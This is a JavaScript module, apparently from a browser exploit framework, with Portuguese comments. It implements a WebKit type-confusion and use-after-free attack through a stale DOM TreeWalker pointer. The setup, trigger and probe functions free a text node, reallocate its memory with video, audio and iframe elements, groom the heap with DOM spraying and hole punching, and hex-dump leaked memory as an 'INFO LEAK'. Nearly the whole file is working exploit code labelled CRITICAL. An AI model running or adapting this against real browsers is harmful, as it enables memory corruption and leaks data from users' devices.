import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'TREEWALKER_TYPE_CONFUSION',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Type Confusion via DOM TreeWalker. O DOM original é destruído, mas o Walker retém ' +
        'um ponteiro stale. Injetamos elementos nativos pesados (<video>) e forçamos o relayout ' +
        'para instanciar os objetos C++ complexos sobre a memória do TextNode antigo.',

    setup: function() {
        this.sandbox = document.createElement('div');
        this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
        document.body.appendChild(this.sandbox);
        
        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
        this.walker.nextNode(); // span
        this.walker.nextNode(); // text "A" (Alvo)
        
        this.targetNode = this.walker.currentNode;
        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
    },

    trigger: function() {
        // 1. Apagamos o nó antigo (Liberta a memória no bmalloc)
        this.sandbox.innerHTML = '';
        
        // 2. Injetamos elementos com estruturas C++ massivas (MediaPlayerPrivate, etc)
        this.sandbox.innerHTML = '<video controls></video><audio></audio><iframe></iframe>';
        
        // FIX: Forçamos o WebKit a desenhar os elementos AGORA.
        // Isto obriga a alocação dos objetos nativos C++ no heap, possivelmente
        // caindo no exato mesmo endereço de memória do antigo text "A".
        void this.sandbox.firstChild.offsetWidth;
        
        // Inundação secundária para empurrar o GC
        let trash = Groomer.sprayDOM('div', 200);
        Groomer.punchHoles(trash, 2);
    },

    probe: [
        // Probe 0: O nó fantasma mudou de identidade?
        s => s.walker.currentNode.nodeName,
        
        // Probe 1: Extrator OOB (Se o C++ achar que o vídeo é um texto)
        s => {
            let nodeName = s.walker.currentNode.nodeName;
            if (nodeName !== '#text') {
                try {
                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
                    if (leakedData && leakedData !== 'A') {
                        let hexDump = '';
                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
                        }
                        return `💥 INFO LEAK (Type Confusion Real): ${hexDump}`;
                    }
                } catch(e) { return `Crash seguro: ${e.message}`; }
            }
            return 'Nó não sobreposto ou seguro';
        }
    ],

    cleanup: function() {
        try { this.sandbox.remove(); } catch(e) {}
    }
};
